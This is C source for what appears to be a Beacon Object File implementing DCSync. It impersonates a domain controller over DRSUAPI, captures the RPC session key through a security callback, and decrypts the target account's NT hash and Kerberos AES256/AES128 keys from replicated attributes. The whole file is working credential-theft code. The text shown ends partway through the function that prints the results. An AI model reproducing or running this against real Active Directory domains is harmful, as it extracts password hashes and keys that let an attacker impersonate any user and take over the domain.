#include "../_include/dcsync.h"
#include "../_include/beacon.h"

#include "../util/ldap_common.c"


void BytesToHex(const BYTE* bytes, DWORD len, char* output) {
    const char* hexChars = "0123456789abcdef";
    for (DWORD i = 0; i < len; i++) {
        output[i * 2] = hexChars[(bytes[i] >> 4) & 0xF];
        output[i * 2 + 1] = hexChars[bytes[i] & 0xF];
    }
    output[len * 2] = '\0';
}

// Session key captured by callback - one-time copy only
static BYTE g_SessionKeyCopy[256] = {0};
static DWORD g_SessionKeyCopyLen = 0;
static volatile LONG g_SessionKeyCapturing = 0;

void RPC_ENTRY RpcSecurityCallback(void *Context) {
    // Atomic check-and-set: only one thread can pass this
    if (InterlockedCompareExchange(&g_SessionKeyCapturing, 1, 0) != 0) {
        return; // Another thread is already capturing or has captured
    }
    
    PCtxtHandle pSecurityContext = NULL;
    SecPkgContext_SessionKey sessionKey = {0, NULL};
    
    if (RPCRT4$I_RpcBindingInqSecurityContext(Context, (void**)&pSecurityContext) != RPC_S_OK || !pSecurityContext) {
        return;
    }
    
    if (SECUR32$QueryContextAttributesA(pSecurityContext, SECPKG_ATTR_SESSION_KEY, &sessionKey) == SEC_E_OK &&
        sessionKey.SessionKeyLength > 0 && sessionKey.SessionKeyLength <= 256 && sessionKey.SessionKey) {
        
        // Copy session key to static buffer
        MSVCRT$memcpy(g_SessionKeyCopy, sessionKey.SessionKey, sessionKey.SessionKeyLength);
        g_SessionKeyCopyLen = sessionKey.SessionKeyLength;
        
        SECUR32$FreeContextBuffer(sessionKey.SessionKey);
    }
}

BOOL DecryptWithSessionKey(const BYTE* encryptedData, DWORD encryptedLen, const BYTE* sessionKey, DWORD sessionKeyLen, BYTE* output, DWORD* outputLen) {
    if (!encryptedData || !sessionKey || !output || encryptedLen < 20) {
        return FALSE;
    }
    
    const BYTE* salt = encryptedData;
    const BYTE* encPayload = encryptedData + 16;
    DWORD encPayloadLen = encryptedLen - 16;
    
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE derivedKey[16];
    DWORD derivedKeyLen = 16;
    
    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
        !ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        if (hProv) ADVAPI32$CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    ADVAPI32$CryptHashData(hHash, sessionKey, sessionKeyLen, 0);
    ADVAPI32$CryptHashData(hHash, salt, 16, 0);
    
    if (!ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, derivedKey, &derivedKeyLen, 0)) {
        ADVAPI32$CryptDestroyHash(hHash);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    ADVAPI32$CryptDestroyHash(hHash);
    ADVAPI32$CryptReleaseContext(hProv, 0);

    BYTE* tempOutput = (BYTE*)MSVCRT$malloc(encPayloadLen);
    if (!tempOutput) {
        return FALSE;
    }
    
    BOOL result = DecryptRC4WithRawKey(encPayload, encPayloadLen, derivedKey, 16, tempOutput);
    
    if (result && encPayloadLen > 4) {
            DWORD receivedChecksum = *(DWORD*)tempOutput;
            DWORD realDataLen = encPayloadLen - 4;
            BYTE* realData = tempOutput + 4;
            
            DWORD calculatedChecksum = 0xFFFFFFFF;  
            for (DWORD i = 0; i < realDataLen; i++) {
                DWORD byte = realData[i];
                calculatedChecksum = calculatedChecksum ^ byte;
                for (int j = 0; j < 8; j++) {
                    DWORD mask = -(calculatedChecksum & 1);
                    calculatedChecksum = (calculatedChecksum >> 1) ^ (0xEDB88320 & mask);
                }
            }
            calculatedChecksum = ~calculatedChecksum;
            
            if (receivedChecksum == calculatedChecksum && outputLen) {
                MSVCRT$memcpy(output, realData, realDataLen);
                *outputLen = realDataLen;
            } else {
                result = FALSE;
            }
    } else {
        result = FALSE;
    }
    
    MSVCRT$free(tempOutput);
    return result;
}

BOOL DecryptRC4WithRawKey(const BYTE* encData, DWORD encLen, const BYTE* key, DWORD keyLen, BYTE* output) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BOOL success = FALSE;
    
    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    struct {
        BLOBHEADER hdr;
        DWORD keySize;
        BYTE keyBytes[16];
    } keyBlob;
    
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_RC4;
    keyBlob.keySize = keyLen;
    MSVCRT$memcpy(keyBlob.keyBytes, key, keyLen);
    
    if (!ADVAPI32$CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(BLOBHEADER) + sizeof(DWORD) + keyLen, 0, 0, &hKey)) {
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    MSVCRT$memcpy(output, encData, encLen);
    
    DWORD dataLen = encLen;
    if (ADVAPI32$CryptDecrypt(hKey, 0, TRUE, 0, output, &dataLen)) {
        success = TRUE;
    }
    
    if (hKey) ADVAPI32$CryptDestroyKey(hKey);
    if (hProv) ADVAPI32$CryptReleaseContext(hProv, 0);
    
    return success;
}

BOOL DecryptRC4(const BYTE* encData, DWORD encLen, const BYTE* rid, BYTE* output) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    BOOL success = FALSE;
    
    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    if (!ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    if (!ADVAPI32$CryptHashData(hHash, rid, 4, 0)) {
        goto cleanup;
    }
    
    if (!ADVAPI32$CryptDeriveKey(hProv, CALG_RC4, hHash, 0, &hKey)) {
        goto cleanup;
    }
    
    MSVCRT$memcpy(output, encData, encLen);
    
    DWORD dataLen = encLen;
    if (ADVAPI32$CryptDecrypt(hKey, 0, TRUE, 0, output, &dataLen)) {
        success = TRUE;
    }
    
cleanup:
    if (hKey) ADVAPI32$CryptDestroyKey(hKey);
    if (hHash) ADVAPI32$CryptDestroyHash(hHash);
    if (hProv) ADVAPI32$CryptReleaseContext(hProv, 0);
    
    return success;
}

BOOL DecryptDESWithRid(const BYTE* encData, DWORD rid, BYTE* output) {
    return encData && output && ADVAPI32$SystemFunction025(encData, &rid, output) == 0;
}

DWORD HexToBinary(const BYTE* hexData, DWORD hexLen, BYTE* binaryOut) {
    if (!hexData || !binaryOut || hexLen < 2) return 0;
    
    DWORD binaryLen = 0;
    for (DWORD i = 0; i + 1 < hexLen; i += 2) {
        BYTE high = hexData[i];
        BYTE low = hexData[i + 1];
        
        // Convert ASCII hex char to nibble
        BYTE highNibble, lowNibble;
        
        if (high >= '0' && high <= '9') highNibble = high - '0';
        else if (high >= 'a' && high <= 'f') highNibble = high - 'a' + 10;
        else if (high >= 'A' && high <= 'F') highNibble = high - 'A' + 10;
        else break; // Invalid hex char
        
        if (low >= '0' && low <= '9') lowNibble = low - '0';
        else if (low >= 'a' && low <= 'f') lowNibble = low - 'a' + 10;
        else if (low >= 'A' && low <= 'F') lowNibble = low - 'A' + 10;
        else break; // Invalid hex char
        
        binaryOut[binaryLen++] = (highNibble << 4) | lowNibble;
    }
    
    return binaryLen;
}

// Parse Kerberos keys from supplementalCredentials
BOOL ParseKerberosKeys(const BYTE* propertyData, DWORD propertyLen, const char* samAccountName, const char* dcHostname, DWORD accountType, char* aes256Out, char* aes128Out) {
    if (!propertyData || !propertyLen || propertyLen < 32 || !samAccountName) return FALSE;
    
    // Skip 4-byte version prefix if present (00 00 00 01/02/03)
    const BYTE* structStart = propertyData;
    if (propertyData[0] == 0 && propertyData[1] == 0 && propertyData[2] == 0 && 
        propertyData[3] >= 1 && propertyData[3] <= 3) {
        structStart += 4;
    }
    
    // Read structure revision (big-endian USHORT at offset +0)
    USHORT revision = *(USHORT*)(structStart + 0);
    revision = ((revision & 0xFF) << 8) | ((revision >> 8) & 0xFF);
    BOOL isRevision0 = (revision == 0);
    
    // Read credential count (position varies by revision, big-endian)
    USHORT credCount = *(USHORT*)(structStart + (isRevision0 ? 2 : 4));
    credCount = ((credCount & 0xFF) << 8) | ((credCount >> 8) & 0xFF);
    if (credCount == 0 || credCount > 100) credCount = 3;
    
    // Read salt length (position varies by revision, big-endian)
    USHORT saltLen = *(USHORT*)(structStart + (isRevision0 ? 6 : 12));
    saltLen = ((saltLen & 0xFF) << 8) | ((saltLen >> 8) & 0xFF);
    if (saltLen == 0 || saltLen > 500) return FALSE;
    
    // Build search string to locate salt end based on account type
    // Trust accounts: uppercase domain FQDN + "krbtgt" + samAccountName (without $)
    // Computer account: uppercase FQDN + "host" + lowercase machine FQDN
    // User accounts: username as-is
    char searchName[256];
    DWORD searchLen = 0;
    DWORD nameLen = 0;
    while (samAccountName[nameLen] != '\0' && nameLen < 128) nameLen++;
    
    if (accountType == SAM_TRUST_ACCOUNT) {
        const char* domain = NULL;
        if (dcHostname) {
            for (DWORD i = 0; dcHostname[i] != '\0'; i++) {
                if (dcHostname[i] == '.') {
                    domain = &dcHostname[i + 1];
                    break;
                }
            }
        }
        if (domain && domain[0] != '\0') {
            // Add uppercase domain
            for (DWORD i = 0; domain[i] != '\0' && searchLen < 230; i++) {
                searchName[searchLen++] = domain[i];
            }
            // Append "krbtgt"
            if (searchLen + 6 < 255) {
                searchName[searchLen++] = 'k';
                searchName[searchLen++] = 'r';
                searchName[searchLen++] = 'b';
                searchName[searchLen++] = 't';
                searchName[searchLen++] = 'g';
                searchName[searchLen++] = 't';
            }
            // Append samAccountName (without trailing $)
            DWORD trustNameLen = nameLen;
            if (trustNameLen > 0 && samAccountName[trustNameLen - 1] == '$') trustNameLen--;
            for (DWORD i = 0; i < trustNameLen && searchLen < 255; i++) {
                searchName[searchLen++] = samAccountName[i];
            }
        }
    } else if (accountType == SAM_MACHINE_ACCOUNT) {
        const char* domain = NULL;
        if (dcHostname) {
            for (DWORD i = 0; dcHostname[i] != '\0'; i++) {
                if (dcHostname[i] == '.') {
                    domain = &dcHostname[i + 1];
                    break;
                }
            }
        }
        
        if (domain && domain[0] != '\0') {
            // Add uppercase domain FQDN
            for (DWORD i = 0; domain[i] != '\0' && searchLen < 200; i++) {
                searchName[searchLen++] = domain[i];
            }
        }
        
        // Append "host"
        if (searchLen + 4 < 255) {
            searchName[searchLen++] = 'h';
            searchName[searchLen++] = 'o';
            searchName[searchLen++] = 's';
            searchName[searchLen++] = 't';
        }
        
        // Add lowercase computer name (without trailing $)
        DWORD compNameLen = nameLen;
        if (nameLen > 0 && samAccountName[nameLen - 1] == '$') compNameLen--;
        
        for (DWORD i = 0; i < compNameLen && searchLen < 254; i++) {
            searchName[searchLen++] = samAccountName[i];
        }
        
        if (domain && domain[0] != '\0') {
            searchName[searchLen++] = '.';
            for (DWORD i = 0; domain[i] != '\0' && searchLen < 255; i++) {
                searchName[searchLen++] = domain[i];
            }
        }
    } else {
        // User account (SAM_USER_OBJECT): uppercase FQDN + samAccountName
        /*
        // This is optional, causes issues with Administrator account. disabled for now
        const char* domain = NULL;
        if (dcHostname) {
            for (DWORD i = 0; dcHostname[i] != '\0'; i++) {
                if (dcHostname[i] == '.') {
                    domain = &dcHostname[i + 1];
                    break;
                }
            }
        }
        
        if (domain && domain[0] != '\0') {
            // Add uppercase domain FQDN
            for (DWORD i = 0; domain[i] != '\0' && searchLen < 200; i++) {
                char c = domain[i];
                if (c >= 'a' && c <= 'z') c -= ('a' - 'A');  // uppercase
                searchName[searchLen++] = c;
            }
        }
        */
        
        // Append samAccountName as-is
        for (DWORD i = 0; i < nameLen && searchLen < 255; i++) {
            searchName[searchLen++] = samAccountName[i];
        }
    }
    
    // Convert to UTF-16LE for searching
    BYTE searchUTF16[512];
    for (DWORD i = 0; i < searchLen; i++) {
        searchUTF16[i * 2] = searchName[i];
        searchUTF16[i * 2 + 1] = 0x00;
    }
    DWORD searchUTF16Len = searchLen * 2;
    
    // Find salt end by locating the search string (case-insensitive)
    DWORD descriptorStart = isRevision0 ? 32 : 28;
    DWORD matchOffset = 0xFFFFFFFF;
    for (DWORD i = descriptorStart + 20; i + searchUTF16Len <= propertyLen; i++) {
        BOOL match = TRUE;
        for (DWORD j = 0; j < searchUTF16Len; j++) {
            BYTE propertyByte = propertyData[i + j];
            BYTE searchByte = searchUTF16[j];
            
            // Case-insensitive comparison for ASCII letters in UTF-16LE (even positions only)
            if (j % 2 == 0) {
                // Convert to uppercase for comparison
                if (propertyByte >= 'a' && propertyByte <= 'z') propertyByte -= ('a' - 'A');
                if (searchByte >= 'a' && searchByte <= 'z') searchByte -= ('a' - 'A');
            }
            
            if (propertyByte != searchByte) {
                match = FALSE;
                break;
            }
        }
        if (match) {
            matchOffset = i;
            break;
        }
    }
    
    if (matchOffset == 0xFFFFFFFF) return FALSE;
    
    // Calculate salt boundaries
    DWORD saltEnd = matchOffset + searchUTF16Len;
    
    // Need at least 48 bytes for AES256 (32) + AES128 (16)
    if (propertyLen - saltEnd < 48) {
        return FALSE;
    }
    
    // Keys are stored after salt as raw binary data
    DWORD scanStart = saltEnd;
    
    for (DWORD tryOffset = scanStart; tryOffset + 48 <= propertyLen; tryOffset++) {
        // Check if this looks like binary key data vs UTF-16LE text
        DWORD zeroCount = 0;
        DWORD evenZeros = 0;   // Zeros at even positions (0, 2, 4...)
        DWORD oddZeros = 0;    // Zeros at odd positions (1, 3, 5...)
        DWORD highBitCount = 0; // Bytes >= 0x80
        
        for (DWORD i = 0; i < 48; i++) {
            BYTE b = propertyData[tryOffset + i];
            if (b == 0x00) {
                zeroCount++;
                if (i % 2 == 0) evenZeros++;
                else oddZeros++;
            }
            if (b >= 0x80) highBitCount++;
        }
        
        // Skip if this looks like UTF-16LE text
        // User account keys may have more zeros than machine/trust keys
        if (oddZeros > 5) continue;  // Too many odd zeros = UTF-16LE pattern  
        if (zeroCount > 30) continue;  // More than ~60% zeros = likely padding
        if (highBitCount < 5) continue;  // Need some high-bit bytes for randomness
        
        // This looks like binary data - validate entropy
        char tempAES256[65] = {0};
        char tempAES128[33] = {0};
        BytesToHex(propertyData + tryOffset, 32, tempAES256);
        BytesToHex(propertyData + tryOffset + 32, 16, tempAES128);
        
        // Check for good entropy (not all same characters)
        DWORD sameCount256 = 0, sameCount128 = 0;
        for (int i = 1; i < 64; i++) {
            if (tempAES256[i] == tempAES256[i-1]) sameCount256++;
        }
        for (int i = 1; i < 32; i++) {
            if (tempAES128[i] == tempAES128[i-1]) sameCount128++;
        }
        if (sameCount256 > 50 || sameCount128 > 25) continue;
        
        // Found valid keys
        if (aes256Out) MSVCRT$memcpy(aes256Out, tempAES256, 65);
        if (aes128Out) MSVCRT$memcpy(aes128Out, tempAES128, 33);
        return TRUE;
    }
    
    return FALSE;
}

void InitDRSRequest(DRS_MSG_GETCHGREQ* request, const GUID* dcGuid, DSNAME* targetDsname) {
    if (!request) return;
    
    MSVCRT$memset(request, 0, sizeof(DRS_MSG_GETCHGREQ));
    
    if (dcGuid) {
        MSVCRT$memcpy(&request->V8.uuidDsaObjDest, dcGuid, sizeof(GUID));
    }
    
    request->V8.pNC = targetDsname;
    MSVCRT$memset(&request->V8.uuidInvocIdSrc, 0, sizeof(UUID));
    MSVCRT$memset(&request->V8.usnvecFrom, 0, sizeof(USN_VECTOR));
    request->V8.pUpToDateVecDest = NULL;
    request->V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
    // Maybe DRS_SPECIAL_SECRET_PROCESSING?
    request->V8.cMaxObjects = 1;
    request->V8.cMaxBytes = 0xA00000;
    request->V8.ulExtendedOp = EXOP_REPL_OBJ;
    MSVCRT$memset(&request->V8.liFsmoInfo, 0, sizeof(ULARGE_INTEGER));
    request->V8.pPartialAttrSet = NULL;
    request->V8.pPartialAttrSetEx = NULL;
    request->V8.PrefixTableDest.PrefixCount = 0;
    request->V8.PrefixTableDest.pPrefixEntry = NULL;
}

DSNAME* BuildDSName(const char* dn, const GUID* guid) {
    if (!dn) return NULL;
    
    size_t dnLen = MSVCRT$strlen(dn);
    if (dnLen > 4096) return NULL; // Sanity check
    wchar_t* wDn = CharToWChar(dn);
    if (!wDn) return NULL;
    
    size_t wDnLen = 0;
    while (wDn[wDnLen] != 0) wDnLen++;
    
    // Calculate structure size properly using FIELD_OFFSET
    // DSNAME has: structLen, SidLen, Guid, Sid (28 bytes), NameLen, StringName[1]
    // We need: base structure + space for (wDnLen) wide chars (StringName[1] already counts for 1)
    // NOTE: structLen should include the null terminator
    DWORD structLen = (DWORD)(sizeof(DSNAME) - sizeof(WCHAR) + ((wDnLen + 1) * sizeof(WCHAR)));
    
    DSNAME* dsname = (DSNAME*)MSVCRT$malloc(structLen);
    if (!dsname) {
        MSVCRT$free(wDn);
        return NULL;
    }
    
    MSVCRT$memset(dsname, 0, structLen);
    dsname->structLen = structLen;
    dsname->NameLen = (DWORD)wDnLen;  // Length WITHOUT null terminator
    dsname->SidLen = 0;  // Not providing SID
    
    // Copy GUID if provided
    if (guid) {
        MSVCRT$memcpy(&dsname->Guid, guid, sizeof(GUID));
    } else {
        MSVCRT$memset(&dsname->Guid, 0, sizeof(GUID));
    }
    
    // Copy the wide string DN (including null terminator)
    for (size_t i = 0; i <= wDnLen; i++) {  // <= to include null terminator
        dsname->StringName[i] = wDn[i];
    }
    
    MSVCRT$free(wDn);
    return dsname;
}

RPC_BINDING_HANDLE CreateDRSBinding(const char* dcHostname) {
    RPC_BINDING_HANDLE binding = NULL;
    unsigned char* stringBinding = NULL;
    RPC_STATUS status;
    
    // Build RPC string binding for DRSUAPI
    // Format: ncacn_ip_tcp:hostname[endpoint]
    status = RPCRT4$RpcStringBindingComposeA(
        NULL,                           // Object UUID
        (unsigned char*)"ncacn_ip_tcp", // Protocol sequence
        (unsigned char*)dcHostname,     // Network address
        NULL,                           // Use dynamic endpoint
        NULL,                           // No options
        &stringBinding
    );
    
    if (status != RPC_S_OK) {
        ERROR_PRINT( "[-] Failed to compose RPC string binding: 0x%x", status);
        return NULL;
    }
    
    // Create binding handle
    status = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &binding);
    RPCRT4$RpcStringFreeA(&stringBinding);
    
    if (status != RPC_S_OK) {
        ERROR_PRINT( "[-] Failed to create RPC binding: 0x%x", status);
        return NULL;
    }
    
    // Set authentication info (use Kerberos/NTLM via NEGOTIATE)
    // Use NULL for SPN to let RPC determine the correct service principal
    status = RPCRT4$RpcBindingSetAuthInfoA(
        binding,
        NULL,                           // Let RPC determine SPN
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL,                           // Use current credentials
        RPC_C_AUTHZ_NAME
    );
    
    if (status != RPC_S_OK) {
        ERROR_PRINT( "[-] Failed to set RPC auth info: 0x%x", status);
        RPCRT4$RpcBindingFree(&binding);
        return NULL;
    }
    
    // Register security callback to capture session key during authentication
    status = RPCRT4$RpcBindingSetOption(binding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR)RpcSecurityCallback);
    if (status != RPC_S_OK) {
        ERROR_PRINT( "[-] Failed to set security callback: 0x%x", status);
        RPCRT4$RpcBindingFree(&binding);
        return NULL;
    }

    return binding;
}

DRS_HANDLE BindToDRS(RPC_BINDING_HANDLE rpcBinding) {
    DRS_HANDLE drsHandle = NULL;
    DRS_EXTENSIONS_INT* extClient = NULL;
    DRS_EXTENSIONS_INT* extServer = NULL;
    UUID clientDsaUuid;
    ULONG result;
    
    // Generate a random client DSA UUID
    RPCRT4$UuidCreate(&clientDsaUuid);
    
    // Create DRS_EXTENSIONS_INT structure like mimikatz
    extClient = (DRS_EXTENSIONS_INT*)MSVCRT$malloc(sizeof(DRS_EXTENSIONS_INT));
    if (!extClient) {
        return NULL;
    }
    MSVCRT$memset(extClient, 0, sizeof(DRS_EXTENSIONS_INT));
    
    extClient->cb = sizeof(DRS_EXTENSIONS_INT);
    extClient->dwFlags = 0x1FFFFFFF;  // All modern capabilities
    extClient->Pid = 0;
    extClient->dwReplEpoch = 0;
    
    // Call IDL_DRSBind - using the Microsoft RPC stub
    result = IDL_DRSBind(
        rpcBinding,
        &clientDsaUuid,
        extClient,
        &extServer,
        &drsHandle
    );
    
    MSVCRT$free(extClient);
    MSVCRT$free(extServer);
    
    if (result != 0) {
        ERROR_PRINT( "[-] DRSBind failed: 0x%x", result);
        return NULL;
    }

    return drsHandle;
}

DWORD GetRIDFromSID(const BYTE* sid, DWORD sidLen) {
    if (!sid || sidLen < 12) return 0;
    
    // SID structure: Revision (1) + SubAuthCount (1) + Authority (6) + SubAuths (4 * count)
    // RID is the last SubAuth value
    BYTE subAuthCount = sid[1];
    if (sidLen < (8 + (subAuthCount * 4))) return 0;
    
    DWORD offset = 8 + ((subAuthCount - 1) * 4);
    DWORD rid = *(DWORD*)(sid + offset);
    
    return rid;
}

void ProcessCredentials(REPLENTINFLIST* objects, const char* samAccountName, const char* dcHostname, const BYTE* sessionKey, DWORD sessionKeyLen) {
    if (!objects) return;
    
    char ntHash[33] = {0};
    char lmHash[33] = {0};
    char aes256Key[65] = {0};
    char aes128Key[33] = {0};
    BOOL foundNT = FALSE;
    BOOL foundLM = FALSE;
    BOOL foundAES256 = FALSE;
    BOOL foundAES128 = FALSE;
    DWORD userRID = 0;
    DWORD accountType = SAM_USER_OBJECT;  // Default to user account
    
    // Iterate through returned objects
    REPLENTINFLIST* current = objects;
    while (current) {
        ENTINF* entinf = &current->Entinf;
        ATTRBLOCK* attrBlock = &entinf->AttrBlock;
        
        // FIRST PASS: Extract RID and account type (needed for decryption and salt construction)
        for (ULONG i = 0; i < attrBlock->attrCount; i++) {
            ATTR* attr = &attrBlock->pAttr[i];
            ATTRTYP attrType = attr->attrTyp;
            
            if (attrType == ATT_OBJECT_SID && attr->AttrVal.valCount > 0) {
                ATTRVAL* val = &attr->AttrVal.pAVal[0];
                userRID = GetRIDFromSID(val->pVal, val->valLen);
            }
            else if (attrType == ATT_SAM_ACCOUNT_TYPE && attr->AttrVal.valCount > 0) {
                ATTRVAL* val = &attr->AttrVal.pAVal[0];
                if (val->valLen == 4) {
                    accountType = *(DWORD*)(val->pVal);
                }
            }
        }
        
        // SECOND PASS: Process all attributes with correct RID
        for (ULONG i = 0; i < attrBlock->attrCount; i++) {
            ATTR* attr = &attrBlock->pAttr[i];
            ATTRTYP attrType = attr->attrTyp;
            
            // NT hash (unicodePwd) - ATTRTYP should be 0x9005A
            if (attrType == ATT_UNICODE_PWD && attr->AttrVal.valCount > 0) {
                ATTRVAL* val = &attr->AttrVal.pAVal[0];
                
                // Modern AD uses encrypted blob format with structure:
                // For 36 bytes: [4 byte header] + [16 byte salt] + [16 byte encrypted hash]
                // For 20 bytes: [4 byte header] + [16 byte encrypted hash]  
                // For 16 bytes: [16 byte encrypted hash] (simple RC4)
                
                if (val->valLen == 16) {
                    BYTE decrypted[16];
                    BYTE ridBytes[4];
                    *(DWORD*)ridBytes = userRID;
                    
                    if (DecryptRC4(val->pVal, 16, ridBytes, decrypted)) {
                        BytesToHex(decrypted, 16, ntHash);
                        foundNT = TRUE;
                    }
                } else if (val->valLen == 20) {
                    BYTE decrypted[16];
                    BYTE ridBytes[4];
                    *(DWORD*)ridBytes = userRID;
                    
                    if (DecryptRC4(val->pVal + 4, 16, ridBytes, decrypted)) {
                        BytesToHex(decrypted, 16, ntHash);
                        foundNT = TRUE;
                    }
                } else if (val->valLen == 36 || val->valLen == 40) {
                    BYTE decrypted[32];
                    BOOL decryptSuccess = FALSE;
                    BYTE ridBytes[4];
                    *(DWORD*)ridBytes = userRID;
                    
                    if (sessionKey && sessionKeyLen > 0) {
                        DWORD outputLen = 0;
                        BYTE sessionDecrypted[32];
                        if (DecryptWithSessionKey(val->pVal, val->valLen, sessionKey, sessionKeyLen, sessionDecrypted, &outputLen)) {
                            if (outputLen >= 16) {
                                BYTE ridDecrypted[16];
                                if (DecryptDESWithRid(sessionDecrypted, userRID, ridDecrypted)) {
                                    MSVCRT$memcpy(decrypted, ridDecrypted, 16);
                                    BytesToHex(decrypted, 16, ntHash);
                                    foundNT = TRUE;
                                    decryptSuccess = TRUE;
                                }
                            }
                        }
                    }
                    
                    if (!decryptSuccess) {
                        BYTE ridDecrypted[16];
                        if (DecryptRC4(val->pVal + 20, 16, ridBytes, ridDecrypted) && ridDecrypted[0] != 0 && ridDecrypted[0] != 0xFF) {
                            BytesToHex(ridDecrypted, 16, ntHash);
                            foundNT = TRUE;
                            decryptSuccess = TRUE;
                        }
                    }
                    
                    if (!decryptSuccess) {
                        BYTE ridDecrypted[16];
                        if (DecryptRC4(val->pVal + 4, 16, ridBytes, ridDecrypted) && ridDecrypted[0] != 0 && ridDecrypted[0] != 0xFF) {
                            BytesToHex(ridDecrypted, 16, ntHash);
                            foundNT = TRUE;
                            decryptSuccess = TRUE;
                        }
                    }
                    
                    if (!decryptSuccess && DecryptRC4(val->pVal, 16, ridBytes, decrypted) && decrypted[0] != 0 && decrypted[0] != 0xFF) {
                        BytesToHex(decrypted, 16, ntHash);
                        foundNT = TRUE;
                        decryptSuccess = TRUE;
                    }
                }
            }
            
            if (attrType == 0x9007D && attr->AttrVal.valCount > 0) {
                ATTRVAL* val = &attr->AttrVal.pAVal[0];
                if (val->valLen > 65536) continue; // Sanity check
                BYTE* decrypted = (BYTE*)MSVCRT$malloc(val->valLen);
                if (!decrypted) continue;
                {
                    BYTE ridBytes[4];
                    *(DWORD*)ridBytes = userRID;
                    
                    BOOL decryptSuccess = FALSE;
                    
                    if (sessionKey && sessionKeyLen > 0 && val->valLen > 108) {
                        DWORD sessionDecryptedLen = 0;
                        BYTE* sessionDecrypted = (BYTE*)MSVCRT$malloc(val->valLen);
                        if (!sessionDecrypted) {
                            MSVCRT$free(decrypted);
                            continue;
                        }
                        
                        if (DecryptWithSessionKey(val->pVal, val->valLen, sessionKey, sessionKeyLen, sessionDecrypted, &sessionDecryptedLen)) {
                            MSVCRT$memcpy(decrypted, sessionDecrypted, sessionDecryptedLen);
                            decryptSuccess = TRUE;
                        }
                        
                        if (sessionDecrypted) MSVCRT$free(sessionDecrypted);
                    }
                    
                    if (!decryptSuccess) {
                        if (DecryptRC4(val->pVal, val->valLen, ridBytes, decrypted)) {
                            decryptSuccess = TRUE;
                        }
                    }
                    
                    if (decryptSuccess) {
                        // USER_PROPERTIES structure:
                        // typedef struct _USER_PROPERTIES {
                        //   DWORD Reserved1;         // offset 0 (4 bytes) - should be 0
                        //   DWORD Length;            // offset 4 (4 bytes) - length of UserProperties data
                        //   WORD Reserved2;          // offset 8 (2 bytes)
                        //   WORD Reserved3;          // offset 10 (2 bytes)
                        //   BYTE Reserved4[96];      // offset 12-107 (96 bytes)
                        //   BYTE UserProperties[1];  // offset 108+
                        // } USER_PROPERTIES;
                        
                        if (val->valLen < 108) {
                            ERROR_PRINT( "[!] Buffer too small for USER_PROPERTIES");
                            MSVCRT$free(decrypted);
                            continue;
                        }
                        
                        DWORD* pLength = (DWORD*)(decrypted + 4);
                        BYTE* propertyData = decrypted + 108;
                        DWORD propertyLen = val->valLen - 108;
                        
                        if (*pLength > 0 && *pLength <= (val->valLen - 108)) {
                            propertyLen = *pLength;
                        }
                        
                        for (DWORD i = 0; i < propertyLen - 40; i++) {
                            if (propertyData[i] == 'P' && propertyData[i+1] == 0x00 &&
                                propertyData[i+2] == 'r' && propertyData[i+3] == 0x00 &&
                                propertyData[i+4] == 'i' && propertyData[i+5] == 0x00 &&
                                propertyData[i+6] == 'm' && propertyData[i+7] == 0x00) {
                                
                                char packageName[128] = {0};
                                int nameIdx = 0;
                                for (int j = 0; j < 200 && (i + j) < propertyLen && nameIdx < 127; j += 2) {
                                    BYTE ch = propertyData[i + j];
                                    BYTE null = propertyData[i + j + 1];
                                    
                                    if (ch == 0 && null == 0) break;
                                    if (null != 0) break;
                                    if (ch < 0x20 || ch > 0x7E) break;
                                    
                                    packageName[nameIdx++] = ch;
                                }
                                packageName[nameIdx] = '\0';
                                
                                if (nameIdx > 8 && MSVCRT$strstr(packageName, "Kerberos")) {
                                    DWORD dataStart = i + (nameIdx * 2) + 2;
                                    if (dataStart >= propertyLen) break;
                                    DWORD remainingLen = propertyLen - dataStart;
                                    if (remainingLen > 32768) break; // Sanity check
                                    
                                    BYTE* decodedValue = (BYTE*)MSVCRT$malloc(remainingLen / 2 + 1);
                                    if (!decodedValue) break;
                                    {
                                        DWORD decodedLen = HexToBinary(propertyData + dataStart, remainingLen, decodedValue);
                                        
                                        if (decodedLen > 0) {
                                            if (ParseKerberosKeys(decodedValue, decodedLen, samAccountName, dcHostname, accountType, aes256Key, aes128Key)) {
                                                if (aes256Key[0] != '\0') foundAES256 = TRUE;
                                                if (aes128Key[0] != '\0') foundAES128 = TRUE;
                                            }
                                        }
                                        
                                        MSVCRT$free(decodedValue);
                                    }
                                }
                            }
                        }
                    }
                    
                    MSVCRT$free(decrypted);
                }
            }
        }
        
        current = current->pNextEntInf;
    }
    
    OUTPUT_PRINT("\n[+] Results:");
    OUTPUT_PRINT("  %s", samAccountName);
    if (foundNT) OUTPUT_PRINT("  nt:\t%s", ntHash);
    if (foundAES256) OUTPUT_PRINT("  aes256:\t%s", aes256Key);
